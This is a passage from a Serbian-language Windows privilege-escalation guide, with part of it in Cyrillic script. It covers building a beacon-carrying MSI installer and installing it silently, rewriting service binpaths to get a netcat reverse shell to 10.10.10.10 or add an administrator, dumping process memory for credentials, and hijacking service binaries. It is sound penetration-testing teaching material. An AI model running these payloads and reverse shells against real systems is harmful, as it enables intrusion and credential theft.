{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Kreiranje MSI-ja pomoću Visual Studio-a

- Pomoću Cobalt Strike-a ili Metasploit-a **generišite** **novi Windows EXE TCP payload** u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i u polje za pretragu unesite „installer”. Izaberite projekat **Setup Wizard** i kliknite na **Next**.
- Unesite naziv projekta, na primer **AlwaysPrivesc**, za lokaciju izaberite **`C:\privesc`**, izaberite **place solution and project in the same directory** i kliknite na **Create**.
- Klikćite na **Next** dok ne dođete do 3. koraka od 4 (izbor datoteka koje treba uključiti). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer-u** i u odeljku **Properties** promenite **TargetPlatform** sa **x86** na **x64**.
  - Možete da promenite i druga svojstva, kao što su **Author** i **Manufacturer**, kako bi instalirana aplikacija delovala legitimnije.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite datoteku **beacon.exe** i kliknite na **OK**. Time ćete obezbediti da se Beacon payload izvrši čim pokrenete instalacioni program.
- U okviru **Custom Action Properties** promenite **Run64Bit** u **True**.
- Na kraju, **izgradite ga**.
  - Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste podesili platformu na x64.

### Instalacija MSI-ja

Da biste **u pozadini** izvršili **instalaciju** zlonamerne datoteke `.msi`:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Da biste iskoristili ovu ranjivost, možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirusni programi i detektori

### Postavke revizije

Ove postavke određuju šta se **beleži**, zato obratite pažnju

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Kod Windows Event Forwarding-a zanimljivo je znati gde se šalju logovi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** je osmišljen za **upravljanje lozinkama lokalnih Administrator naloga**, čime se obezbeđuje da svaka lozinka bude **jedinstvena, nasumično generisana i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju u Active Directory-ju i mogu im pristupiti samo korisnici kojima su dodeljene odgovarajuće dozvole putem ACL-ova, što im omogućava da vide lozinke lokalnih administratora ako su ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke se čuvaju u LSASS-u kao običan tekst** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u potražite na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Počevši od **Windows 8.1**, Microsoft je uveo poboljšanu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njenu memoriju** ili ubacuju kod, čime se sistem dodatno štiti.\
[**Više informacija o LSA Protection potražite ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti akreditive sačuvane na uređaju od pretnji kao što su pass-the-hash napadi. [**Više informacija o funkciji Credential Guard dostupno je ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Keširani akreditivi

**Akreditivi domena** se autentifikuju pomoću **Local Security Authority** (LSA) i koriste ih komponente operativnog sistema. Kada se podaci za prijavljivanje korisnika autentifikuju pomoću registrovanog bezbednosnog paketa, obično se uspostavljaju akreditivi domena za tog korisnika.\
[**Više informacija o keširanim akreditivima potražite ovde**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Korisnici i grupe

### Izlistaj korisnike i grupe

Trebalo bi da proveriš da li neka od grupa kojima pripadaš ima zanimljive dozvole.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda ćete moći da eskalirate privilegije**. Ovde saznajte više o privilegovanim grupama i kako da ih zloupotrebite za eskalaciju privilegija:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Na sledećoj stranici saznajte **više o zanimljivim tokenima** i kako da ih zloupotrebite:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / Sesije

```bash
qwinsta
klist sessions
```

### Korisničke fascikle

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politika lozinki

```bash
net accounts
```

### Preuzimanje sadržaja međuspremnika

```bash
powershell -command "Get-Clipboard"
```

## Pokrenuti procesi

### Dozvole za datoteke i fascikle

Pre svega, prilikom izlistavanja procesa proverite da li se u komandnoj liniji procesa nalaze lozinke.\
Proverite da li možete da prepišete neku pokrenutu binarnu datoteku ili imate dozvole za pisanje u fasciklu sa binarnim datotekama kako biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md); mogli biste da ih zloupotrebite za eskalaciju privilegija.

Debugger listener može kratko da traje, pa to što ga nema u jednom pasivnom snimku portova ne dokazuje da nikada nije bio izložen. Povežite svaki uočeni listener sa njegovim PID-om, vlasnikom procesa i mogućnošću korisnika sa nižim privilegijama da mu pristupi; samo ime aplikacije ili debug zastavica ne dokazuju mogućnost izvršavanja koda između korisnika. Rutinsku enumeraciju obavljajte pasivno, bez slanja debugger komandi.

**Provera dozvola binarnih datoteka procesa**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Provera dozvola fascikli u kojima se nalaze binarne datoteke procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort direktorijumi dinamičkih preprocesora

Snort 2 može da učitava deljene biblioteke iz direktorijuma `dynamicpreprocessor directory` navedenog u konfiguraciji izabranoj pomoću `snort.exe -c <config>`. Ako zakazani zadatak ili servis pokreće Snort pod drugim nalogom, proverite tu konkretnu konfiguraciju i ACL direktorijuma navedenog za module. Ako vaš token može da kreira datoteke u tom direktorijumu, putanja je kandidat za proveru mogućnosti izvršavanja koda pri sledećem učitavanju modula koje obavi taj zadatak ili servis. Proverite efektivne privilegije naloga pod kojim se proces pokreće, aktivnu konfiguraciju, kompatibilnost modula i sva ograničenja zabrane pristupa ili deljenja; sama mogućnost pisanja u direktorijum ne dokazuje eskalaciju. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) opisuje učitavanje modula tokom izvršavanja.

### Privilegovani veb-servis sa upisivim korenom dokumenta

Na Windows instalaciji Apache-a uporedite putanju izvršne datoteke servisa i nalog pod kojim se pokreće sa `DocumentRoot` direktivom u aktivnoj datoteci `httpd.conf`. Kod uobičajenog XAMPP rasporeda proverite `C:\xampp\apache\conf\httpd.conf` i ACL konfigurisanog korena dokumenta, često `C:\xampp\htdocs`. Ako korisnik sa nižim privilegijama može da kreira datoteke u tom korenu dok Apache radi kao `LocalSystem`, izvršavanje koda na strani servera može da pređe granicu privilegija računara. Potvrdite da je servis pokrenut, da se sadržaj poslužuje sa tačne putanje i da rukovalac na strani servera obrađuje tip datoteke; mogućnost pisanja u koren sama po sebi dokazuje samo kreiranje datoteka. Proverite ACL-ove bez upisivanja probne datoteke:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Za uobičajenu WAMP instalaciju, servis može da pokazuje na verzionisanu putanju `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ili `C:\wamp\...` za 32-bitni raspored), sa konfiguracijom u istoj fascikli, pod `conf\httpd.conf`, i podrazumevanim korenom `C:\wamp64\www` ili `C:\wamp\www`. Proverite tačnu izvršnu datoteku servisa, identitet pod kojim se pokreće, efektivni `DocumentRoot` (uključujući proširivanje `${INSTALL_DIR}` i izmene virtuelnih hostova) i ACL korena kao celinu. To što je WAMP direktorijum upisiv ne dokazuje da se Apache pokreće kao `SYSTEM` niti da izvršava poslatu datoteku. [Apache dokumentuje kako Windows servis bira svoju konfiguraciju](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Upisiv IIS koren i mrežni identitet skupa aplikacija

Za IIS, povežite upisiv fizički direktorijum sa **aktivnom lokacijom/aplikacijom** u `applicationHost.config`, a zatim utvrdite koji joj je skup aplikacija dodeljen i koji rukovalac obrađuje zahteve na serveru. Kod smešten u direktorijumu koji se poslužuje izvršava se kao skup aplikacija samo ako IIS obrađuje tu vrstu datoteke i ako je putanja dostupna. Pre nego što upisiv direktorijum smatrate mogućnošću za izvršavanje koda, proverite efektivna ovlašćenja trenutnog korisnika za kreiranje datoteka, stanje lokacije tokom rada, rukovalac i izmene konfiguracije za konkretnu putanju.

Dinamičko prevođenje ASP.NET aplikacija predstavlja zasebnu putanju koju treba proveriti: generisane datoteke u direktorijumu za prevođenje aplikacije. Podrazumevano, to je direktorijum `Temporary ASP.NET Files` u okviru odgovarajuće instalacije .NET Framework-a, ali `<compilation tempDirectory>` u aplikaciji može da ga promeni. [Microsoft dokumentuje lokaciju i poddirektorijume za pojedinačne aplikacije](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) i [preporučuje izdvajanje direktorijuma za prevođenje kada skupovi aplikacija nemaju međusobno poverenje](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ako token sa nižim privilegijama može da izmeni generisani izvorni kod u kešu **konkretne** aplikacije, utvrdite da li ga ta aplikacija ponovo prevodi pod privilegovanijim [identitetom radnog procesa](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL datoteke ili direktorijuma ne dokazuje izvršavanje koda: povežite keš sa aktivnom aplikacijom, efektivnim tokenom i ACL-om, postavkama prevođenja, identitetom procesa i vremenom eventualnog ponovnog prevođenja. Koristite pregled metapodataka samo za čitanje; tokom enumeracije nemojte pokretati prevođenje niti menjati datoteke keša.

Skup IIS aplikacija konfigurisan kao `ApplicationPoolIdentity` ili `NetworkService` obično se za pristup domenskim resursima autentifikuje kao **nalog računara domaćina**, iako njegov lokalni token može imati niske privilegije. `LocalSystem` već ima visoke lokalne privilegije, a na mreži takođe koristi nalog računara; `LocalService` obično koristi anonimne mrežne akreditive. Skup `SpecificUser` koristi nalog koji mu je konfigurisan. [Microsoft dokumentuje ove tipove identiteta](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) i [mrežni identitet skupa aplikacija](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ako postavka identiteta nije navedena, mogu važiti podrazumevane vrednosti skupa, koje se razlikuju između generacija IIS-a, zato utvrdite efektivnu konfiguraciju umesto da nagađate na osnovu naziva skupa. Ako se izvršavanje koda odvija u skupu koji koristi mrežni identitet naloga računara, procenite prava **tog konkretnog računara** u direktorijumu. Za [DCSync](../active-directory-methodology/dcsync.md) potrebna su prava replikacije nad kontekstom imenovanja domena; tiket naloga računara ili uloga domaćina sami po sebi ne dokazuju da ta prava postoje. Pasivna enumeracija treba da pregleda konfiguraciju i ACL-ove bez otpremanja datoteke, uspostavljanja mrežne autentifikacije ili zahtevanja tiketa.

Kod čitljivog ASP.NET rukovaoca koji pokreće pomoćni proces, pratite svaku vrednost izvedenu iz zahteva kroz autentifikaciju, dešifrovanje, validaciju i formiranje komande. Rukovalac koji spaja dekodirani token u `ProcessStartInfo("cmd", "/c ...")` može omogućiti da metaznakovi ljuske promene komandu; [Microsoft dokumentuje specijalne znakove za `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Utvrdite da li nepouzdani pozivalac zaista može da utiče na dekodiranu vrednost i pristupi rukovaocu, a zatim utvrdite efektivni identitet skupa aplikacija ili identitet pod kojim se vrši impersonacija, kao i identitet pod kojim se pokreće podređeni proces. Čitljiva linija izvornog koda, listener na localhost-u ili slabost formata tokena sami po sebi ne dokazuju izvršavanje privilegovane komande. Pregledajte izvorni kod i konfiguraciju skupa bez slanja falsifikovanih zahteva ili pokretanja pomoćnog procesa tokom pasivne enumeracije.

Kod PHP servisa na Windows-u, putanja kontrolisana zahtevom i prosleđena funkciji [`include` ili `require`](https://www.php.net/manual/en/function.include.php) može da izvrši PHP datoteku upisivu za korisnika sa nižim privilegijama, pod identitetom radnog procesa. Potvrdite da zahtev može da dođe do te naredbe, da razrešena putanja vodi do datoteke koju korisnik sa nižim privilegijama može da izmeni, a radni proces da pročita, da važeća PHP ograničenja putanja dozvoljavaju uključivanje i da radni proces zaista radi sa višim privilegijama. Listener na loopback adresi ili upisiva datoteka sami po sebi ne dokazuju ovaj lanac; pregledajte izvorni kod, identitet servisa i ACL-ove datoteka bez pozivanja krajnje tačke tokom pasivne enumeracije.

### Iskopavanje lozinki iz memorije

Možete napraviti dump memorije procesa koji je u toku pomoću **procdump** iz paketa sysinternals. Servisi kao što je FTP imaju **akreditive u čistom tekstu u memoriji**; pokušajte da napravite dump memorije i pročitate akreditive.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Nesigurne GUI aplikacije

**Aplikacije koje se pokreću kao SYSTEM mogu omogućiti korisniku da pokrene CMD ili pregleda direktorijume.**

Primer: „Windows Help and Support“ (Windows + F1), pretražite „command prompt“, kliknite na „Click to open Command Prompt“

### Uvoz projektnih datoteka sa povišenim privilegijama

Aplikacija koja automatski otvara projekte iz direktorijuma za otpremanje u koji može da piše korisnik nižih privilegija prelazi granicu poverenja pri unosu podataka pod nalogom uvoznika. Proverite **tačnu putanju za upis**, proces ili zadatak koji je otvara, njegov efektivni identitet i verziju parsera. [Istorijski problem pri otvaranju/obnavljanju Ghidra projekta](https://github.com/NationalSecurityAgency/ghidra/issues/71) omogućavao je upotrebu XML external entities u metapodacima projekta; mrežni entitet u Windows-u mogao je da izazove autentifikaciju naloga uvoznika ako to dozvoljavaju [pravila za odlazni SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To ukazuje na izlaganje akreditiva, a ne na neposredan administratorski pristup: odgovor mora da bude iskoristiv kroz zasebnu autorizovanu ili ranjivu putanju, a trenutne verzije treba proveriti u odnosu na njihovo stvarno stanje zakrpa. Tokom pasivne enumeracije nemojte otvarati posebno izrađen projekat; pregledajte tok uvoza i ACL-ove.

## Servisi

Pravo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) nad objektom Service Control Manager (SCM) odvojeno je od prava nad postojećim servisom. Uspešan zahtev za pristup samo za čitanje putem [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) za to pravo predstavlja trag za dalju proveru, a ne dokaz da se novi servis može pokrenuti. [`CreateService` vraća handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) sa pristupom servisu zatraženim prilikom kreiranja; naknadno ponovno otvaranje servisa podrazumeva zasebnu proveru pristupa i može da ne uspe čak i kada bi mogao da se iskoristi prvobitni handle. Zasebno proverite efektivni lokalni ili udaljeni token, odobrena prava handle-a, nalog servisa, pravila pokretanja i putanju izvršne datoteke. Tokom pasivne enumeracije nemojte kreirati niti pokretati servis.

Kod udaljene putanje za instalaciju servisa, povežite ta prava nad SCM-om sa deljenim resursom na ciljnom sistemu na koji može da piše **ista mrežna prijava**, njegovim osnovnim NTFS ACL-om i lokalnom putanjom do izvršne datoteke koju nalog servisa može da pokrene. Nalog koji nije administratorski može da pređe ovu granicu ako postoje neuobičajeno široka SCM prava i putanja za smeštanje datoteke; administrativni deljeni resurs nije nužan preduslov. Sam pristup za upis u deljeni resurs ili samo trag o pravу за креирање сервиса преко SCM-а не доказује да нови сервис може да се покрене са вишим идентитетом.

Постојећи сервис може да позове помоћну извршну датотеку при покретању, гашењу или другом догађају животног циклуса, чак и ако те датотеке нема у његовом `ImagePath`. Ако се име помоћне датотеке разрешава у директоријум у који може да пише корисник нижих привилегија, а сервис ради под вишим идентитетом, недостајућа датотека помоћног програма може бити кандидат за условну замену. Потврдите **стварни код сервиса или документовани позив помоћног програма**, разрешену путању до извршне датотеке и редослед претраге, права за креирање директоријума, идентитет сервиса и доступан окидач животног циклуса. Само директоријум сервиса у који може да се пише или недостајућа датотека не доказују да сервис учитава ту датотеку; током пасивне провере не треба покретати нити заустављати сервис.

За постојећи сервис, [`SERVICE_START` омогућава прослеђивање аргумената функцији `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); то је одвојено од [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Прегледајте код сервиса или документовани интерфејс пре него што приступ покретању сматрате нечим више од права за контролу. Ако користи аргумент који је одабрао позивалац као путању за евиденцију или извоз, проверите идентитет сервиса, тачан ток од аргумента до уписа, ограничења путање и дозволе над **креираном датотеком**. Упис у заштићени директоријум може довести до ескалације само ако постоји засебан привилеговани потрошач или учитавач који прихвата ту датотеку; датотека евиденције у коју може да се пише или само право покретања нису довољни. Током пасивног инвентарисања немојте покретати сервис нити креирати пробну датотеку.

За NSClient++ monitoring agent, датотека `nsclient.ini` доступна за читање представља **траг за проверу конфигурације**: може да садржи акредитиве за веб-приступ, док `boot.ini` може да преусмери конфигурацију на другу локацију. Проверите стварни налог сервиса, WEB listener и смернице за приступ, као и да ли аутентификована улога може да мења подешавања или скрипте. За привилеговано извршавање потребни су и `CheckExternalScripts` (или друга омогућена путања за извршавање), ефективно право за регистровање или измену команде и окидач који је покреће под идентитетом сервиса. Listener доступан само преко loopback-а и даље може бити доступан локалном кориснику, али сама путања датотеке, лозинка или listener не доказују постојање тих права. Током пасивне провере прегледајте метаподатке и дозволе без приказивања тајни или позивања веб API-ја. Погледајте [распоред датотека NSClient++](https://nsclient.org/docs/concepts/file-layout/), [безбедносне смернице за веб и скрипте](https://nsclient.org/docs/setup/securing/) и [конфигурацију external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

За сервис чији је `ImagePath` `nssm.exe`, проверите стварни налог под којим се сервис покреће и његову вредност `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM тамо чува подређену апликацију](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), док је `AppDirectory` његов конфигурисани радни директоријум. Пре него што дозволе wrapper-а сматрате целом границом сервиса, проверите подређену извршну датотеку и ACL-ове њених родитељских директоријума. Локална WCF или SOAP крајња тачка коју та подређена апликација излаже засебан је траг за проверу: потврдите да је доступна кориснику нижих привилегија, да конкретна операција прихвата његов унос и да подређена апликација сервиса извршава небезбедну операцију под вишим идентитетом. Налог сервиса, URL крајње тачке или путања у коју може да се пише сами по себи не доказују ескалацију; избегавајте позивање операција сервиса током пасивне провере.

За прилагођену WCF операцију пратите унос стринга под контролом позиваоца до било ког PowerShell runspace-а. [`Pipeline.Commands.AddScript` додаје текст скрипте](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke` покреће pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` са акредитивима Windows transport-а](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) аутентификује клијента, али ауторизацију за позивање те **конкретне** операције и ефективни идентитет runspace-а треба проверити засебно. Путања од уноса позиваоца нижих привилегија до `AddScript` под вишим идентитетом сервиса представља границу за извршавање кода; порт који слуша, аутентификован клијент или некоришћена метода у неповезаном склопу сами по себи нису доказ. Статички прегледајте инсталирани сервис, уговор, ауторизацију и подешавања impersonation-а, без позивања крајње тачке током enumerације.

Service Triggers омогућавају Windows-у да покрене сервис када наступе одређени услови (активност named pipe/RPC endpoint-а, ETW догађаји, доступност IP-а, прикључење уређаја, освежавање GPO-а итд.). Чак и без права SERVICE_START често је могуће покренути привилеговане сервисе активирањем њихових окидача. Технике за enumerацију и активирање погледајте овде:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio diagnostic collector service

Инсталације Visual Studio-а са C/C++ алатима могу да укључују `VSStandardCollectorService150`, дијагностички сервис конфигурисан да ради као `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) користио је junction и трку са object-manager-link-ом за преусмеравање ресетовања DACL-а сервиса. Демонстрирана ескалација је захтевала и употребљиву путању за поправку MSI-ја компонете Visual Studio Setup WMI Provider, као и циљ `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонента је поправљена у јануару 2024.

За пасивну почетну проверу прегледајте налог и бинарну путању тог сервиса, проверите да ли постоји путања до Setup WMI compiler-а и утврдите статус закрпа инсталиране компоненте. Унос сервиса, верзија производа Visual Studio или сама датотека compiler-а не доказују да је хост рањив. Приликом прегледа није потребно покретати сервис нити извршавати поправку.

Набавите листу сервиса:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Dozvole

Možete koristiti **sc** da biste dobili informacije o servisu.

```bash
sc qc <service_name>
```

Preporučuje se da imate binarni fajl **accesschk** iz _Sysinternals_ kako biste proverili potreban nivo privilegija za svaki servis.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Preporučuje se da proverite da li grupa „Authenticated Users“ može da menja neku uslugu:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Možete preuzeti accesschk.exe za XP ovde](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako dobijate ovu grešku (na primer, sa SSDPSRV):

_Došlo je do sistemske greške 1058._\
_Usluga ne može da se pokrene jer je onemogućena ili zato što nijedan uređaj povezan sa njom nije omogućen._

Možete je omogućiti pomoću

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Imajte na umu da servis upnphost zavisi od servisa SSDPSRV da bi radio (za XP SP1)**

**Još jedno zaobilazno rešenje ovog problema** je pokretanje:

```
sc.exe config usosvc start= auto
```

### **Izmena putanje binarne datoteke servisa**

U scenariju u kom grupa „Authenticated users“ ima dozvolu **SERVICE_ALL_ACCESS** za servis, moguće je izmeniti izvršnu binarnu datoteku servisa. Da biste izmenili i izvršili **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponovno pokretanje servisa

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privilegije se mogu eskalirati pomoću različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Omogućava promenu konfiguracije binarne datoteke servisa.
- **WRITE_DAC**: Omogućava promenu dozvola, što može omogućiti promenu konfiguracije servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i promenu dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost promene konfiguracije servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost promene konfiguracije servisa.

Za otkrivanje i iskorišćavanje ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole za binarne datoteke servisa

Ako se servis pokreće kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ili privilegovani domenski nalog, a **korisnici sa niskim privilegijama mogu da menjaju EXE datoteku servisa ili njenu nadređenu fasciklu**, servis se često može preoteti **zamenom binarne datoteke i ponovnim pokretanjem servisa**.

**Proverite da li možete da menjate binarnu datoteku koju servis izvršava** ili da li imate **dozvole za pisanje u fasciklu** u kojoj se nalazi binarna datoteka ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Sve binarne datoteke koje servis izvršava možete da pronađete pomoću **wmic** (ne u system32), a svoje dozvole možete da proverite pomoću **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Možete koristiti i **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Potražite opasne ACL dozvole dodeljene grupama **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, naročito **`(F)`**, **`(M)`** ili **`(W)`** nad izvršnom datotekom servisa ili direktorijumom koji je sadrži. Praktičan tok zloupotrebe je:<sup>[[27]](#references)</sup>

1. Potvrdite nalog servisa i putanju do izvršne datoteke pomoću `sc qc <service_name>`.
2. Potvrdite da li je binarna datoteka upisiva pomoću `icacls <path>`.
3. Zamenite binarnu datoteku servisa payload-om ili važećom zlonamernom binarnom datotekom servisa.
4. Ponovo pokrenite servis pomoću `sc stop <service_name> && sc start <service_name>` (ili sačekajte ponovno pokretanje sistema / okidač servisa).

Korisne automatizovane provere:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ako servis ne dozvoljava običnom korisniku da ga ponovo pokrene, proverite da li se automatski pokreće pri podizanju sistema, da li ima podešenu akciju pri otkazu koja ga ponovo pokreće ili može posredno da ga pokrene aplikacija koja ga koristi.

### Dozvole za izmenu registra servisa

Trebalo bi da proverite da li možete da izmenite neki registar servisa.\
Možete da **proverite** svoje **dozvole** nad **registrom** servisa pomoću:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Izvorna provera dozvola bila je navedena ovako:

Treba proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole `FullControl`. Ako ih imaju, binarna datoteka koju servis izvršava može da se izmeni.

